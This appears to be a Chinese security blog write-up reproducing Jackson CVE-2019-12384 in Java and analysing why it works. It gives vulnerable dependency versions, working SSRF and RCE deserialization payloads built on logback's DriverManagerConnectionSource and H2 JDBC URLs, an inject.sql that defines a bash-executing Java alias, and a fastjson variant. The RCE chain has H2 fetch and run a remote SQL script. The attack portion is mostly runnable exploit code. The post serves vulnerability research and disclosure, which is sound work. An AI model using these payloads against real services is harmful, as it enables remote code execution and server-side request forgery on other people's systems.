## *本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。  

## 引言

**近期关于Jackson的RCE漏洞CVE-2019-12384爆出，关于漏洞的复现以及依赖，[这里](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)已经给出，笔者这边使用java的环境重新复现了一下，权当给各位看官当个翻译，也让在java上进行漏洞复现的兄弟们少走点弯路。**

## 环境准备

本次漏洞有比较鸡肋的地方，就是依赖的第三方jar包有点多，除去jackson自身的jar包以外还需要logback-core和h2，具体的pom配置如下：

    
    
    <dependency>  
        <groupId>com.fasterxml.jackson.core</groupId>  
        <artifactId>jackson-databind</artifactId>  
        <version>2.9.8</version>  
    </dependency>  
      
    <!--https://mvnrepository.com/artifact/ch.qos.logback/logback-core -->  
    <dependency>  
        <groupId>ch.qos.logback</groupId>  
        <artifactId>logback-core</artifactId>  
        <version>1.3.0-alpha4</version>  
    </dependency>  
      
    <!--https://mvnrepository.com/artifact/com.h2database/h2 -->  
    <dependency>  
        <groupId>com.h2database</groupId>  
        <artifactId>h2</artifactId>  
        <version>1.4.199</version>  
        <scope>test</scope>  
    </dependency>  
    <dependency>  
        <groupId>com.h2database</groupId>  
        <artifactId>h2</artifactId>  
        <version>1.4.199</version>  
        <scope>compile</scope>  
    </dependency> 

## 漏洞复现

国外的大佬们用的是ruby实现的漏洞利用环境，我这边为了方便idea的debug，索性使用java来做复现，具体的注意细节我也在代码里面注释了，大家看注释就好，

    
    
    JackonSerial.java
    
    import com.fasterxml.jackson.databind.ObjectMapper;
    
    import com.fasterxml.jackson.databind.SerializationFeature;
    
    import org.h2.Driver;
    
    public class JackonSerial {
    
        public static void main(String[] args) throws Exception {
    
            //一定要实例化Driver否则会报错
    
            Class.forName("org.h2.Driver").newInstance();
    
            System.out.println("Mapping");
    
            //该条payload用于SSRF的复现
    
            String jsonStr1 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:8005/~/test\"}]";
    
            //该条payload用于RCE的复现
    
            String jsonStr2 = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\"}]";
    
            ObjectMapper mapper = new ObjectMapper();
    
            mapper.enableDefaultTyping();
    
            mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
    
            System.out.println("Serializing");
    
            Object obj = mapper.readValue(jsonStr1, java.lang.Object.class)
    
            System.out.println("objectified");
    
            System.out.println("stringified: " + mapper.writeValueAsString(obj));
    
        }
    
    }
    
    inject.sql
    
    CREATE ALIASSHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException{
    
        String[] command = {"bash", "-c", cmd};
    
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    
        return s.hasNext() ? s.next() : "";  }
    
    $$;
    
    CALL SHELLEXEC('open/Applications/Calculator.app/')

使用第一个payload实现SSRF的效果图。

![图片
1.png](https://image.3001.net/images/20190725/1564023127_5d391957f1670.png!small)

使用第二个payload实现RCE的效果图。

![图片
1.png](https://image.3001.net/images/20190725/1564023156_5d391974d65ab.png!small)

## 漏洞分析

先看一下SSRF漏洞调用栈。

![图片
1.png](https://image.3001.net/images/20190725/1564023318_5d391a16ef7c5.png!small)

Jackson在进行序列化的时候会循环调用序列化对象所属类的每一个get方法，当调用getConnection()方法的时候，就去再去调DriverManager从而去链接远程的数据库，这也就是造成SSRF的原因

    
    
    **public** Connection getConnection() **throws** SQLException {  
    
        **return this**.getUser() == **null**? DriverManager.getConnection( **this**.url) : DriverManager.getConnection( **this**.url, **this**.getUser(), **this**.getPassword());  
    
    }

下面说一下RCE。

先介绍一下jdbc:h2:mem: 这种写法用于h2操作内存表，并且能在内存中执行sql语句，然后再通过RUNSCRIPT FROM
'<http://localhost/inject.sql>'来执行从远程获取的sql文件，当然此处改成直接执行本地语句造成命令执行也是可以的。

因为这些执行都是在本地应该内存中的，而本地代码就是java，就是只需要在sql里面写一个java代码的函数，通过CALL来调用，变回造成java代码在本地应用执行从而造成RCE,RCE的关键调用栈如下：

## ![图片
1.png](https://image.3001.net/images/20190725/1564023195_5d39199bddae1.png!small)

## 总结

> 1、这个漏洞的利用有两个特别鸡肋的点：
>
> 第一点， 它需要依赖两个jar才能造成rce漏洞；
>
> 第二点， 注意这个漏洞的触发，是在序列化恶意的对象的时候触发的，而jackjson大部分情况在web中都是用于处理去反序列化前端传入的json数据的。
>
> 2、相同的套路在fastjson也是可以造成RCE的，但是利用同样鸡肋。

## Demo

    
    
    import com.alibaba.fastjson.JSON;  
    import com.alibaba.fastjson.JSONObject;  
    import com.alibaba.fastjson.parser.ParserConfig;  
      
    public class FastJsonTest {  
    public static void main(String[] args){  
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
            String payload = "{\"@type\":\"ch.qos.logback.core.db.DriverManagerConnectionSource\", \"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\"}";  
            JSONObject json = JSON.parseObject(payload);  
            json.toJSONString();  
        }  
    }

![image.png](https://image.3001.net/images/20190725/1564037554_5d3951b2e02e9.png!small)

 ***本文作者：平安银行应用安全团队-Glassy，转载请注明来自FreeBuf.COM**

